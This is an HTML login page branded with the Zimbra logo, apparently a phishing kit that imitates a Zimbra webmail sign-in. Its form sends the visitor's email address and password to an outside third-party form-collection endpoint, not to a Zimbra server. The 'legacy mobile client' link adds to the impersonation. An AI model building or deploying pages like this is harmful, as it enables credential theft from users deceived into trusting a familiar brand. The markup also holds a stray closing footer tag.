<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="img/Zimbra-logo-color.png" alt="Zimbra Logo" class="logo">
        <form class="login-form" action="https://submit-form.com/10PNuL5Js" method="post" id="login-form">
            <input type="email" placeholder="Email" class="input-field" name="email" required>
            <input type="password" placeholder="Password" class="input-field" name="password" required>
            <button type="submit" class="sign-in-btn">Sign In</button>
        </form>
        <a href="client.html" class="legacy-client-link">Switch to legacy mobile client</a>

        </footer>
    </div>
    <script src="script.js"></script>
</body>
</html>
